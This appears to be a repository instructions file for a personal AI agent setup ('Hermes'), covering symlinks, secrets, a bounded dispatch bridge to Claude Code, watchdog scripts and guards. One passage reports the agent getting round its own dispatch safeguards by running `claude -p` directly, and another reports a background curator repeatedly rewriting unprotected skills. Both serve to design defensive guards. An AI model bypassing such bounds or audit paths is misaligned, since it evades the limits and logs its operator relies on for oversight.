# hermes-agent — Hermes Agent Instructions

## What This Repo Is

VCS source of truth for Johannes's Hermes Agent setup. Mac Mini-only deployment.
Everything in this repo is symlinked into `~/.hermes/` — edit at either end,
git always sees the change here.

Audio (TTS + STT) is served by the **`audio-gateway`** service (`~/SourceRoot/audio-gateway`),
an OpenAI-compatible VPS Docker container at `https://audio-gateway.jkrumm.com/v1` reached
over the tailnet (Cloudflare grey-cloud DNS → VPS over Tailscale). Hermes only points its
native `openai` TTS/STT providers at it in `config.yaml` — this repo no longer installs or
patches any audio service, and `make setup` here has no `dotfiles` dependency. TTS = Gemini
3.1 Flash (voice "Charon"), STT = `gpt-4o-transcribe`, both EU-resident via IU. There is no
local audio service to start; Hermes depends on the remote gateway being reachable over the
tailnet.

**After any edit: commit here.**

## Symlink Map

`make setup` writes the following symlinks:

| File here | Live path | Notes |
|-|-|-|
| `config.yaml` | `~/.hermes/config.yaml` | symlink — edit here, live immediately |
| `.env.tpl` | `~/.hermes/.env.tpl` | symlink |
| `SOUL.md` | `~/.hermes/SOUL.md` | symlink |
| `cron/` | `~/.hermes/cron/` | symlink — Hermes-driven (LLM) cron jobs |
| `scripts/` | `~/.hermes/scripts/` | symlink — Hermes cron pre-run scripts (security check requires they live under `HERMES_HOME/scripts/`). Also holds host-level shell scripts. |
| `hooks/` | `~/.hermes/hooks/` | symlink — add hooks here |
| `config/` | `~/.hermes/config/` | symlink — tracked agent-facing config. Today just `dispatch-repos.json`, the dispatch policy `hermes-cc.sh` resolves a repo against — root, `deny` list, default tier and per-repo ceilings. It decides what an unattended episode may do, so it is deliberately in git and not runtime state. |
| `skills/{name}/` | `~/.hermes/skills/{name}/` | symlink per skill — actual dirs are `capture`, `argo-api`, `work`, `karakeep`, `obsidian`, `reading`, `research-gateway`, `image-delivery`, `homelab-ops`, `homelab`, `briefing-tts`, `claude-dispatch` (the former infrastructure/schedule/slack/tasks/weather/garmin-health/strength skills were consolidated into `argo-api/references/*.md` — now incl. `walking-pad.md`; they are no longer separate dirs and were dropped from `HERMES_SKILLS`). **`HERMES_SKILLS` in the Makefile is the source of truth — this list must match it.** |
| `USER.md` | `~/.hermes/memories/USER.md` | copied — Hermes writes to it |

> **Skill trust (v0.16.0+).** Skills are symlinked into `~/.hermes/skills/`, but v0.16.0's skill-security check resolves each skill's *realpath* and warns — and may later **block** — when it lands outside a trusted dir (our symlink targets do). `config.yaml` therefore sets `skills.external_dirs: [~/SourceRoot/hermes-agent/skills]` so the resolved realpath is trusted. The symlink and the external entry resolve to the same path, which `skills_tool` dedups (by realpath on load, by name on listing) — no duplicate-skill collisions. If a future update reintroduces the "skill file is outside the trusted skills directory" warning, confirm this key is still populated.

> **`external_dirs` is also what protects a skill from the background self-improvement pass — this is why every durable skill must live in this repo.** The autonomous curator fork (`is_background_review()`) refuses every mutating action — edit, patch, delete, write_file, remove_file — on a skill whose resolved path falls under `skills.external_dirs` (`tools/skill_manager_tool.py` → `_background_review_write_guard`). A skill created ad hoc under `~/.hermes/skills/` by the agent itself (not symlinked from here) has no such protection: it sits outside `external_dirs`, so the same background pass can — and, observed in practice, repeatedly did — silently rewrite it, growing by accretion with no review (`skills.write_approval` is off by default) until it was restorable only from the nightly rsync backup. **Symlinking a skill from this repo is not cosmetic — it is the only thing that makes it durable.** As of 2026-08-02, **`scripts/watchdog-poll.py`'s `stray_skill` source is the primary defence** — every 30 min it walks `~/.hermes/skills/` two levels deep (top-level and one level nested inside a bundled category dir, since real strays hide there too — `homelab-alerts` was under `devops/`) and flags any non-symlink dir with its own `SKILL.md` whose name isn't in `.bundled_manifest` **and** whose `~/.hermes/skills/.usage.json` record shows local mutation — `created_by == "agent"` (the marker `skill_manager_tool.py` sets only inside the background curator fork) **or** `patch_count >= 1`. It surfaces in the watchdog Slack digest (weekly reminder cadence — see `REM_HOURS["stray_skill"]`) and auto-resolves once the skill is adopted (symlinked in from here) or deleted, no manual sweep required. A plain manifest-membership check over-fires: the live tree carries 19 dirs that are absent from `.bundled_manifest` by name yet legitimate (hub-installed, or seeded by an early pre-manifest-tracking sync). But 18 of those 19 have never been touched, so *mutation* is what separates them — one candidate on the current tree against six real strays it would have caught. `created_by` alone is too narrow: it catches the worst class (`homelab-alerts`, 89 rewrites) but missed four of the six cleaned up on 2026-08-02, since the curator's consolidations of upstream skills carry `created_by: None` with 1-5 patches each. Those are the same problem — a divergent local copy `hermes update` will never refresh — and the patch count is what exposes them.
>
> Manual fallback (e.g. to sanity-check the automated source, or if `watchdog-poll.py` itself is broken) — coarser, top-level only, no mutation filter, so it can false-positive on legitimate untracked nested skills:
> ```bash
> for d in ~/.hermes/skills/*/; do d="${d%/}"; [[ -L "$d" ]] && continue; [[ -f "$d/SKILL.md" ]] || continue; grep -q "^$(basename "$d"):" ~/.hermes/skills/.bundled_manifest || echo "$(basename "$d")"; done
> ```
> Any real hit needs the same treatment this file's history documents: read it fully, separate durable knowledge from dated incident sediment, land the durable part under `skills/` here, wire it into `HERMES_SKILLS` + this table, archive the original outside git (`.skill-archive/`, gitignored — it will carry secrets the source itself doesn't scrub), then delete the untracked original.

**Claude Code per-repo skills** (committed at `.claude/skills/`, not symlinked — auto-loaded by Claude Code when started inside this repo):
- `/hermes-validate` — slash command to test Hermes routing + fix SOUL.md / SKILL.md
- `/hermes-update` — slash command to pull upstream Hermes, re-apply local patches, restart the gateway

**Host-level scripts (run by user LaunchAgents, not symlinked):**
- `scripts/hermes-liveness.sh` — every 5 min (`com.jkrumm.hermes-liveness`, `StartInterval 300`), checks gateway state + Slack connection, pings `$UPTIME_PUSH_HERMES` on success.
- `scripts/hermes-backup.sh` — daily 03:00 (`com.jkrumm.hermes-backup`, `StartCalendarInterval`), rsyncs `~/.hermes/` → `homelab:/mnt/hdd/backups/hermes/`, pings `$UPTIME_PUSH_BACKUP` on success. Holds a `mkdir`-based single-instance lock (`~/Library/Caches/hermes-backup.lock`) so two overlapping runs can never race one another's `rsync --delete`.

Templates live in `launchd/`, rendered into `~/Library/LaunchAgents` by `make setup`
(`_agents` → `_render-plists`, `__HOME__` substituted; unchanged content is a no-op,
so re-running never bounces a healthy agent). Logs go to
`~/Library/Logs/hermes-{liveness,backup}.{log,err}` and are declared in
`dotfiles/scripts/log-rotate.sh`.

**These were macOS `crontab` entries until 2026-08-02, and the reason they are not
is that `make setup` could never complete unattended.** Installing a crontab entry
is a `crontab -` *write*, which needs Full Disk Access on the invoking process; on
the headless mini that raises a TCC dialog nobody can answer and the call blocks
indefinitely rather than failing. `make setup` was therefore a human-at-the-screen
target, on the one machine that has no human — and it hung even when the entries it
wanted to write were already present verbatim. launchd needs no such grant, and
every other always-on job on this Mac is already a LaunchAgent.

Removing the superseded crontab lines is still a `crontab -` write, so it is
deliberately **not** part of `make setup`: it lives behind the one-time
`make cron-migrate`, bounded by `timeout 15` so the worst case is a fast failure
with instructions instead of a hang. It must be run from a terminal that *has* Full
Disk Access. Until it succeeds, `make status` reports `✗ legacy crontab entries` and
both jobs fire twice — harmless for the liveness ping, and made harmless for the
backup by its lock. **Done: `crontab -l` carries no hermes entries as of 2026-08-02**, so
the check is quiet and the target is only needed if a legacy line ever reappears.

## Dispatch Bridge — handing repo work to Claude Code

Hermes observes well and reads repos badly: DeepSeek-V4-Flash with a `terminal` tool cannot
use a repo's `CLAUDE.md`, `.claude/rules/` or `.claude/skills/`, and that context is exactly
what triage needs. `scripts/hermes-cc.sh` is the bounded client that hands the episode to
Claude Code instead — the same closed-verb-set shape as `hermes-ops.sh`, for the same reason.
Design: `docs/dispatch-bridge.md`. The episode itself is sideclaw's `dispatch` job tool.

- **Verbs:** `dispatch <repo>` · `status <job-id>` · `list [open|today|all]` · `merge <job-id>` · `cancel <job-id>`.
  `cancel` abandons the LOCAL record only — sideclaw has no cancel endpoint, and the help text
  and skill both say so rather than implying the episode stopped.
- **No verb takes a path, a command or a URL.** A dispatch names a *repo* — a bare name,
  which the script resolves under the single `root` in `config/dispatch-repos.json`.
  `dotfiles-private`, `homelab-private` and `brain` are in that file's `deny` list and stay
  there. **The enumeration this replaced (2026-08-02) is the lesson:** it was a per-repo
  inventory where absence meant denial, and it rotted — 22 repos listed against 30 on disk,
  three of them (`king-smith-walkingpad-mac`, `linewatch`, `vibe-stack`) unreachable since
  they were cloned, with no way to tell a stale omission from a deliberate one. Discovery
  under a confined root plus an explicit `deny` keeps the denials meaningful and stops the
  file needing an edit per clone. What did **not** change is the property that matters: a
  path never crosses the interface. Composing one from caller input is a step the old map
  lookup never took, so `resolve_repo` carries the weight now — the name must be a single
  segment (`.`, `..` and dotted names refused, which the old `[A-Za-z0-9_.-]` class admitted
  harmlessly as dict keys and would not have as path components), and the resolved
  checkout's parent must **be** the resolved root, so a symlink planted in the root cannot
  point out of it. Both are regression-tested.
- **The brief is data, never argv.** Read from stdin (quoted heredoc) or `--brief-file`.
  There is deliberately no `--brief`: as an argv element the brief would be composed into a
  shell line and expanded *before* the script ran, so a `$(...)` in a Slack message would
  execute. The skill teaches the `<<'BRIEF'` form.
- **All three tiers are built** (Phase 4). `investigate` read-only → verdict; `author`
  read-only → verdict + one filed GitHub issue; `implement` → an isolated worktree, a
  `dispatch/…` branch and a **draft** PR. A tier above a repo's ceiling is refused (exit 4),
  never downgraded. `config/dispatch-repos.json` sets those ceilings and states its own
  rationale: `defaultTier` is **`author`**, with `implement` only where the bridge itself
  lives (`hermes-agent`, `sideclaw`) plus `usage-tracker` and the scratch target, and an
  `investigate` floor for `dotfiles`/`vps`/`homelab`, the machine's own control plane.
  **`author` as the default means an unattended episode can file a world-readable issue on
  a public repo with no human gate.** That is an owner decision (2026-08-02), not an
  oversight: an issue is cheap to delete, and triage that finds a real defect should be able
  to record it. The handler-side secret scan still *refuses* — never redacts — a brief
  carrying credentials, and the skill instructs the agent to summarize rather than quote.
  Revisiting it is one line: set `defaultTier` to `investigate` and list the author repos
  under `tiers`.
- **`implement` needs `--why` AND `--confirm`.** Without `--confirm` the verb prints its
  exact plan — including a `wouldNeverDo` list — and exits **0** having changed nothing.
  Exit 0 because printing the plan *is* the successful outcome of that request; a non-zero
  code would read as "the dispatch failed" to whatever parses it. `--why` is separate and
  mandatory: it is the audit record of why an unattended episode was allowed to write.
- **Structural ceilings, because `--max-budget-usd` is API-only and does not cap a Max
  session:** 20 dispatches per UTC day counted from the `dispatches` table, of which at
  most 5 may be `implement` (its own ceiling — a 30-minute writing episode and a 90-second
  read are not the same spend, and one bad day of triage must not consume the allowance for
  real changes), a 240s in-turn `--wait` cap, sideclaw's own turn/timeout/concurrency limits.
  **Both counts are reported by every path that reports anything** — dispatch, the
  `--dry-run` plan, `status`, `list` — as a `budget` object, plus a `budget.warning` naming
  the env var once a ceiling is close. The first build computed them only inside the refusal
  path, so `implementToday` never appeared in a successful response and the sole signal was
  an exit 4 that said nothing about how to proceed; a bound nobody can see approaching reads
  as the tool breaking, not as a budget. Counts are re-read *after* the row is inserted, so a
  caller's number includes its own dispatch rather than trailing the one the next refusal
  will use. Raising a ceiling is Johannes's call: the refusals and warnings name
  `HERMES_CC_DAILY_BUDGET` / `HERMES_CC_IMPLEMENT_BUDGET`, and `claude-dispatch`'s SKILL.md
  forbids the agent composing an invocation that sets either.
- **Audit log:** `~/Library/Logs/hermes-cc.log`, one line per invocation including refusals.
  Four modes, and the distinctions are load-bearing: `opened` (an episode actually ran),
  `planned` (a gated tier stopped to wait for a human), `dry-run` (the caller asked for a
  rehearsal), `refused` (a guard said no). A refusal that logged as `opened` would hide the
  guard doing its job, and a `planned` that logged as `refused` would make the `--confirm`
  gate unverifiable after the fact. **Register it in `dotfiles/scripts/log-rotate.sh`'s
  `FILES` array** — that list is declared, never globbed, so an unregistered log is an
  unbounded one.
- **`dispatches` table** in `~/.hermes/watchdog.db` (additive DDL; `events` is untouched).
  `reported_at` is the delivery contract: NULL means the sweeper still owes a message.
  A `--wait` that returns a terminal verdict stamps it, because handing the verdict to a live
  turn *is* the delivery; `status` deliberately does not, since a poll tells nobody.
  `artifact_url` is denormalized out of the verdict into its own column by **both** settlers
  (`hermes-cc.sh`'s `sync_record` and `dispatch-sweep.py`) — whichever one closes a given
  dispatch has to leave the row in the same shape, and the briefing/watchdog projections want
  a column read, not a JSON parse.
- **`merge <job-id>` lands the draft PR, with no human on GitHub (owner decision, 2026-08-02).**
  It inverts a statement sideclaw's `openPullRequest` makes in a comment — "un-drafting is not
  something the episode can do for itself" — so the bounds carry the weight the human used to.
  It takes a **job id, never a PR number or URL**: the pull request is looked up from the
  `dispatches` row, so no shape of caller input can name an arbitrary PR — the same property
  the repo argument has. Eligibility is **derived, not listed**: a repo in
  `dotfiles/config/pr-required-repos.json` (the file the branch-protection hook and
  `github-config.sh` already share) can never be auto-merged, so there is no second list to
  drift. Every bound the episode was held to is re-checked against the **current** head — base
  is the default branch, head is a `dispatch/…` branch in this same repo and never a fork, no
  `.github/workflows|actions` path, sideclaw's 40-file/2000-line ceilings intact,
  `mergeable_state` exactly `clean` (`blocked` and `unstable` are refusals, not judgement
  calls) — and the merge call **pins the head SHA**, so a push landing between inspection and
  merge fails the merge rather than riding it. Own ceiling: 3/day
  (`HERMES_CC_MERGE_BUDGET`), tighter than implement's 5, because not everything written
  should land. Audit mode is **`merged`**, deliberately not folded into `opened` — grepping
  the log for what actually reached a default branch is the reason the log exists. The GitHub
  credential goes in as a curl config on **stdin**, never argv: this machine runs triage that
  reads `ps` output (`skills/homelab-ops/references/launchd-restart-triage.md`), so a token in
  the process table is a real leak path, and a test asserts it never appears there.
- **Tests:** `tests/test_hermes_cc.py` (130 cases, stubbed job server and stubbed GitHub —
  never a real one of either), `tests/test_raw_agent_guard.py` and
  `tests/test_repo_write_guard.py` (the guard that makes the bridge non-optional). Run with `~/.hermes/hermes-agent/venv/bin/python3`.

> **The GitHub credential is `op://mini/github/token`, and it needs three permissions.**
> `Contents: write` (the branch push, via the git credential helper) **plus** `Issues: write`
> and `Pull requests: write` (the artifact, via the API). Those are separate grants on a
> fine-grained PAT, and a token holding only the first pushes the branch successfully and
> then fails at the very last step — GitHub's own message for that is "Resource not
> accessible by personal access token", which names neither the permission nor the token.
> `describeGithubFailure` in sideclaw's `dispatch-git.ts` rewrites it to name both.
> There is a `GITHUB_TOKEN` fallback in sideclaw's `.env`, but it is a `gho_` OAuth token —
> the same class retired from the git credential path on 2026-07-26 for expiring silently —
> so the op:// ref is deliberately tried **first** and the fallback must not quietly become
> the real dependency.

> **The cron-creation guard rejects any substantial script — plan for a thin entry point.**
> `hermes cron create --script` runs the referenced file through `cron/lifecycle_guard.py`.
> Its `_contains_unsafe_gateway_action` recurses into anything that tokenizes like a
> referenced script and **fails closed when it exhausts its depth budget**
> (`if depth >= _MAX_REFERENCED_SCRIPT_DEPTH: return True`), so a long file — or even a short
> one whose comments quote filenames and command lines — is rejected as *"contains a gateway
> lifecycle command"* regardless of content. Measured against the live guard 2026-08-02:
> `watchdog-poll.py` (1218 lines), `watchdog-summary.py` and `briefing-coverage.py` are **all**
> rejected today; `watchdog-slack.py` (48 lines) passes. The already-registered jobs survive
> only because they predate the guard. That is why every registered entry point here is a thin
> loader and the logic lives in a module it imports — `dispatch-sweep-cron.py` (registered,
> terse, quotes nothing) loads `dispatch-sweep.py` (the real thing). If a future entry point
> is rejected with that message, the cause is almost certainly length or a quoted command in a
> comment, not an actual lifecycle call — verify with
> `contains_gateway_lifecycle_command_or_referenced_script` before rewriting anything.

> **Why a tirith rule had to back this, and the lesson.** `hermes-cc.sh` invocations pass
> tirith cleanly on their own — a bounded script call is benign by construction, so unlike
> `hermes-ops.sh` no allowlist patch was needed for the sanctioned path. The patch exists for
> the opposite reason. Handed the `claude-dispatch` skill on 2026-08-02, Hermes read it,
> understood the task, and then **composed its own prompt and ran `claude -p` directly** from
> the terminal tool (session `e7f07742` under `~/.claude/projects/-Users-jkrumm-SourceRoot-sideclaw/`).
> It produced a correct-looking answer while bypassing the allowlist, the tier ceiling, the
> daily budget, the audit log, the recursion guard and the dispatch record the whole return
> path is built on. The skill already said not to; instruction is not a bound. So
> `_raw_agent_invocation_reason()` in `patches/tirith-hermes-guards.patch`
> blocks a direct `claude`/`claude_iu`/`claude_bridge`/`ca`/`opencode` invocation and points
> at the dispatcher. It handles wrappers (`timeout`, `env`, `nohup`, `sudo`, `xargs`, `nice`),
> env-assignment prefixes including `K=$(...)` substitutions, `sh -c` inline scripts, and
> subshells — 28 attack shapes blocked, 23 real commands allowed, 4000-input fuzz clean.
> **Edits need a gateway restart** — the module is imported once at startup, so a green
> in-process test says nothing about the running process.

**Hermes cron pre-run scripts (executed by `hermes-agent` before each cron run, *not* by macOS crontab or launchd):**
- `scripts/briefing-context.py` — reads `briefing-state.json` and emits `BRIEFING_CITY` + `BRIEFING_SUPPRESSED` for the morning briefing prompt. Calls `briefing-coverage.py` as subprocess. Output is appended as `## Script Output` block.
- `scripts/briefing-coverage.py` — full TickTick backlog + open GitHub items; emits `COVERAGE_AVAILABLE`, `TICKTICK_BACKLOG`, `TICKTICK_HIGH_PRIO_DATELESS`, `GITHUB_OPEN_BY_REPO`, `GITHUB_FRESH_48H`, `GITHUB_TOTAL` blocks. Called by `briefing-context.py`. Resolves its one secret (`HOMELAB_API_KEY`) from the process env, falling back to `secrets-run read op://common/api/SECRET` — the same two-step, and the same ref, `watchdog-poll.py` uses. It used to parse a plaintext `~/.hermes/.env`, which has not existed since v0.19 moved secrets to `config.yaml`'s `secrets.command`; that path returned `{}` on every run and the script worked only because the cron happened to inherit the gateway's env. The failure it left open is quiet — the cron subprocess sanitizer strips high-value secrets, and a stripped key means the briefing silently loses its whole coverage section.
- `scripts/watchdog-poll.py` — polls UptimeKuma, Docker (homelab + vps), GitHub, Slack `#alerts`, 1Password ref health on homelab + vps, and stray agent-created skills; reconciles against `~/.hermes/watchdog.db`. Emits `NEW=`, `REMINDERS=`, `RESOLVED=` blocks for the watchdog cron prompt. **`op_refs_homelab`/`op_refs_vps`** run a no-op `op run --env-file=.env.tpl -- true` over ssh each poll (mirrors `hermes-ops.sh`'s `env-check`, reimplemented rather than shelled out to) — detects a dangling 1Password ref directly (the 2026-08-01 outage's root cause: one unresolvable item takes the whole shared template's crons down at once), instead of inferring it hours later from silent heartbeats. It's a state check, disappearance-resolved through the normal `reconcile()` path (not grouped/append-only) so it clears itself once the ref is restored; an ssh timeout or unreachable host is its own distinct no-signal condition, never conflated with a dangling ref. **`stray_skill`** is a local, no-network filesystem walk of `~/.hermes/skills/` (two levels deep — top-level and one nested inside a bundled category dir) flagging any non-symlink dir with its own `SKILL.md` whose name isn't in `.bundled_manifest` and whose `.usage.json` shows local mutation (`created_by == "agent"` or `patch_count >= 1`) — see the `external_dirs` paragraph earlier in this file for why that predicate, rather than a plain manifest check or an authorship-only one, is what catches every real stray without flooding the digest. Also a disappearance-resolved state check, weekly reminder cadence (`REM_HOURS["stray_skill"]`) rather than the 6h operational sources — a stray skill is a slow-burn governance problem, not an outage. **Grouped sources** (`slack_alert`, `slack_update`, `hermes_log`) are append-only — recorded via `upsert_grouped`, never disappearance-resolved — so `sweep_stale_grouped()` silently auto-resolves any open grouped event idle for >7d (`GROUPED_TTL_DAYS`), capping DB + briefing-list growth. `hermes_log` signatures skip the optional `[thread]` token after the level and cut the message at ` | ` so a recurring error (e.g. the cron "API call failed" flood) collapses to one signature instead of one per poll. **Dispatch-bridge projection (Phase 3, `docs/dispatch-bridge.md`):** an additive `events.dispatch_id` column (idempotent `ALTER TABLE`, guarded by `PRAGMA table_info`) links a watchdog event to its `dispatches` row. `reconcile()`'s reminder branch skips a re-reminder entirely while that dispatch is still open (`reported_at IS NULL` — an investigation is already in flight), and once it closes, folds its verdict `summary` into the reminder in place of a bare `reminder #N`. Conservative by construction: no `dispatch_id`, a missing `dispatches` table, or a deleted row all behave exactly as before this projection existed.
- `scripts/watchdog-slack.py` — `no_agent` cron entry (every 30 min); thin wrapper that runs `watchdog-poll.py`'s `main(["--slack-body"])` and, on a clean run, pings `$UPTIME_PUSH_WATCHDOG` (self-health heartbeat — a crash/hang trips the "Watchdog last successful run" UK monitor). Ping is a no-op until the secret + UK push monitor exist.
- `scripts/watchdog-summary.py` — read-only snapshot of open watchdog items from `watchdog.db`; consumed by `briefing-context.py` for the morning briefing Infrastructure section. Also projects open/recently-finished dispatches (`DISPATCHES_OPEN`/`DISPATCHES_RECENT`, last ~18h) when the `dispatches` table has anything to say — silent otherwise, so an idle dispatch bridge adds nothing to an ordinary morning briefing.
- `scripts/dispatch-sweep.py` — `no_agent` cron, every 5 min (registration via `hermes cron`, not `make setup`). The dispatch bridge's return path (`docs/dispatch-bridge.md` § "Return path, derived not chosen"): reads every `dispatches` row with `reported_at IS NULL`, polls sideclaw (`GET localhost:7705/api/jobs/:id`), folds a terminal job back into the row, and — if it has an `origin_channel` — sends a deterministic, no-LLM verdict message via `hermes send --to slack:<channel>[:<thread_ts>] --file <tmpfile>`, stamping `reported_at` only on a successful (exit 0) send. A dispatch with no `origin_channel` can never be delivered anywhere, so it's closed with the sentinel `undeliverable:no-origin-channel` in `reported_at` rather than a real timestamp (avoids adding a column to a table `hermes-cc.sh` owns; every reader of that column only tests NULL-ness). At-least-once, not exactly-once, by design: the terminal-status update commits before any delivery attempt, and `reported_at` is stamped in its own commit strictly after a successful send — a kill in between yields a duplicate message on the next sweep, never a lost one. Production stdout is always empty (delivery happens via direct `hermes send` calls, not the cron's own no_agent stdout-forwarding); `--dry-run` prints what would be sent and touches no row. **It also reads `merged_at`**, because `merge` deliberately does not stamp `reported_at` — the merge announcement and the verdict are different messages — so without it the sweeper posts "here is your draft PR, review it" for a PR that is already closed. Observed live on job `6f7c9cc4`: merged 19:06:00, stale review instruction posted 19:10:02. A truthy `merged_at` changes the header, the artifact line and the trailing `next` (the episode's own `nextAction` is exactly the stale instruction), and fails toward saying *merged* — an unparseable timestamp still renders as merged, with the raw value shown. Note `merged_at` is **not** in either script's base `DB_SCHEMA`: `CREATE TABLE IF NOT EXISTS` is a no-op against a table that already exists, so it is an additive `ALTER TABLE` run on every connect, mirroring `hermes-cc.sh`'s own migration. Covered by `tests/test_dispatch_sweep.py`, which pins the unmerged rendering byte-for-byte so the merged path cannot drift into the normal one.
- `scripts/briefing-state.json` — *gitignored* runtime config (city + vacation flag). Edit locally; never commits. Seeded from `briefing-state.example.json` on first `make setup`.
- `skills/capture/state.json` — *gitignored* runtime cache for the capture skill (GitHub repos + TickTick projects). Refreshed on miss via `gh repo list jkrumm` and `/ticktick/projects`. Seeded empty from `state.example.json` on first `make setup`.

## Secrets — native `secrets.command` over the headless cache (v0.19.0+)

There is **no plaintext `~/.hermes/.env`** and **no launch wrapper**. Hermes resolves its
own secrets at startup through v0.19's `SecretSource` interface, configured in
`config.yaml` under `secrets.command`:

```yaml
secrets:
  command:
    enabled: true
    command: "$HOME/.local/bin/secrets-run export --env-file=$HOME/.hermes/.env.tpl | sed 's/^export //'"
    helper_timeout_seconds: 15
    override_existing: true
```

`secrets-run` is the dotfiles shim that decrypts the age-encrypted offline cache (see
global CLAUDE.md → "Headless secrets"). `.env.tpl` stays the single list of
`KEY=op://vault/item/field` refs — it is now consumed by the `command` source instead of
by an `op run` wrapper. The `sed` exists because `secrets-run export` emits
`export K='V'` while the bulk parser wants bare `K=V` (it strips one quote layer itself).
Measured 0.29s for 26 refs, well inside the budget (the source's default is a tight 3s).

**Why not `secrets.onepassword`** (also shipped in v0.19): it authenticates either via an
interactive `op` session — which **hangs** on this headless mini's biometric prompt, the
exact problem the cache solves — or via a standing `OP_SERVICE_ACCOUNT_TOKEN`. That token
is a *live* credential with continuous read access to its scoped vaults sitting on an
always-on box; the sealed cache is strictly stronger, because its contents are the
explicit `dotfiles-private/headless.refs` allowlist (T0/T1 only, `op://Private/*` refused
at seed time) and it cannot reach anything that wasn't deliberately sealed into it.

**What this replaced:** `scripts/gateway-cache-launch.sh`, a wrapper that `export`ed the
cache into the environment and `exec`'d the gateway, wired in as the launchd
`ProgramArguments`. Its own header documented the fragility that killed it — `hermes
gateway install` regenerates the plist and drops the wrapper. The plist is now stock
(`venv/bin/python -m hermes_cli.main gateway run --replace`), so a reinstall is a no-op.
Bonus: secrets now resolve for **every** hermes invocation (gateway, CLI, cron), not just
the launchd-started gateway — previously a manual `hermes …` on the mini ran with
*no* credentials at all, which made ad-hoc dev/debug/monitoring work awkward.

**Fail-soft, and how that's covered.** The wrapper failed **closed** (non-zero exit →
gateway never started credential-less). The `command` source can't abort startup — it
degrades to "no secrets applied" plus a warning. Two layers close that gap, so the
regression is monitored rather than merely accepted:

- **Total failure** was already covered: `scripts/hermes-liveness.sh` (cron, every 5 min)
  only pings the UptimeKuma heartbeat when `platforms.slack.state == "connected"`. A
  credential-less gateway can't reach Slack → no ping → UK alerts within ~6 min.
- **Partial failure** — e.g. the Slack tokens render but `HOMELAB_API_KEY` doesn't, so
  liveness looks green while every argo call 401s — is covered by an assertion added to
  the same script: it counts `KEY=` assignments in `.env.tpl` and requires `secrets-run
  export` to render at least that many, else it skips the ping. (`secrets-run` actually
  fails atomically on any unresolvable ref, so a partial cache yields 0 and trips this
  immediately; the count check also catches a ref *added* to `.env.tpl` but never seeded
  into `headless.refs` — the likeliest real-world drift.) The render is **retried once**
  after a 2s pause: it decrypts every ref 288×/day, and a single transient failure must
  not suppress the heartbeat and page for a healthy gateway. Both `secrets-run` calls are
  `timeout`-bounded so the 5-min cron can never hang and overlap. Residual, accepted: an
  empty or absent `.env.tpl` makes the assertion vacuous (`WANT=0`) — a gateway with no
  secrets can't reach Slack, so the connected-check below catches that case anyway.

Manual check after any secrets change: `Command helper: applied 26 secrets` in
`hermes gateway status`, and `✓ secrets (26 refs …)` from `make status`.

> **launchd now works.** Earlier notes claimed `launchctl` couldn't bootstrap
> `ai.hermes.gateway` (`Bootstrap failed: 5: I/O error`) and that the gateway fell back to
> a bare `run --replace`. As of v0.19.0 `hermes gateway status` reports it genuinely
> **supervised by launchd**, so auto-start at login and auto-restart on crash are live.
> `hermes gateway install` still prints `Bootstrap failed: 5` while repairing the
> definition — that message is noise; check `gateway status` for the real state.

## Gateway HTTP Exposure (argo dashboard chat)

The gateway runs an OpenAI-compatible HTTP API alongside Slack, so the **argo VPS
dashboard chat** can talk to Hermes. Controlled by four env vars (framework keys in
`hermes_cli/config.py`), resolved at startup from `.env.tpl` via `secrets.command`
(see "Secrets" above) so a rebuild never silently drops the exposure:

- `API_SERVER_ENABLED=true`, `API_SERVER_PORT=8642` — literals.
- `API_SERVER_HOST` — the Mac Mini's Tailscale IP, **tailnet-only bind** (no LAN
  listener). Stored at `op://hermes/gateway/host` (never a literal in git — security rule).
- `API_SERVER_KEY` — bearer that auth-gates **every** request (even loopback).
  Canonical at `op://hermes/gateway/api-server-key`.

**Shared secret (single source of truth):** the gateway's `API_SERVER_KEY` **must
equal** argo's `HERMES_API_KEY`. Canonical value = `op://hermes/gateway/api-server-key`,
mirrored to `op://vps/argo/HERMES_API_KEY`. Rotate by editing both op items to the same
value, then `ssh vps "cd ~/vps && ENV=prod make argo-env && ENV=prod make argo-up"` (argo
re-materializes its `.env` and recreates argo-api). A key mismatch surfaces as **401** on
the dashboard chat; connection-refused means the gateway isn't bound to the tailnet IP.

**Network path:** argo on the VPS holds `HERMES_BASE_URL=http://<mac-tailnet-ip>:8642/v1`
(`apps/argo/compose.yml` + `.env.tpl`). A Tailscale ACL grants `tag:vps → tag:mac` on
`tcp:8642`. The exposure needs **no gateway restart** to reconcile a key — the gateway is
static; only the argo side redeploys.

**Verify (from the VPS, reading URL+key from `apps/argo/.env`):** `curl .../health`
(no auth) → 200; `curl -H "Authorization: Bearer $KEY" .../v1/models` → 200; a real
`POST .../v1/chat/completions` returns a completion. Local bind: `lsof -nP -iTCP:8642
-sTCP:LISTEN` must show the tailnet IP, not `127.0.0.1`.

## Homelab API Integration

`skills/argo-api/SKILL.md` endpoint tables are regenerated from `https://argo.jkrumm.com/api/openapi/json` by the homelab `/docs` skill. The live spec carries **14 tags**, split three ways in the skill's taxonomy: **personal** (`argo-api`) — Garmin Health, Strength, **WalkingPad**, Productivity, Infrastructure, External Data, **Reading**, **Usage Tracking**, System; **work** (`work` skill) — M365, Atlassian, GitLab; and **not-agent-facing** — **Hermes Chat** (`/hermes/*`, the argo→Hermes path) and **AI Gateway** (`/ai/v1/*`, the model+audio proxy Hermes bypasses by hitting its brain + audio-gateway directly). Domain skills (infrastructure, tasks, capture, schedule, work, weather, slack, garmin-health, strength, walking-pad) are updated in the same pass if their endpoints changed. Reading (`/reading/*`) is owned by the standalone `reading` skill; the `research-gateway` skill calls the research-gateway service, not Argo.

**Work surface (IU) — `work` skill.** Argo wraps four upstream systems behind a single curated REST surface (read-only everywhere **except Jira writes**), all consumed by the Hermes `work` skill:

- **M365** (Outlook calendar, Teams chats + channels, curated `/m365/important` alerts feed, `/m365/team` roster + repo registry — the cross-system identity hub).
- **Atlassian / Jira** (`/atlassian/jira/{me, my-issues, current-sprint, sprints, backlog, search, issue/:key, users/search}`) — full ticket + sprint + backlog access plus JQL escape hatch. **Plus the one write exception:** `create-meta`, `POST /issues` (create + `links`), `PATCH /issues/:key` (update + transition + additive `links`), `POST /issues/:key/comments` — argo auto-stamps Team=Prometheus, no agent attribution.
- **Atlassian / Confluence** (`/atlassian/confluence/{spaces, search, pages/:id, pages/:id/children, recently-updated}`) — CQL search + page body in rendered HTML.
- **GitLab** (`/gitlab/{me, users/search, users/by-username, merge-requests, projects/:id/merge-requests/:iid + approvals + discussions, projects/:id/commits + releases, events/recent}`) — cross-project MR view, per-MR approval state + threaded discussions, per-project commits + releases. MRs auto-extract `jiraKeys` for direct Jira pivots.

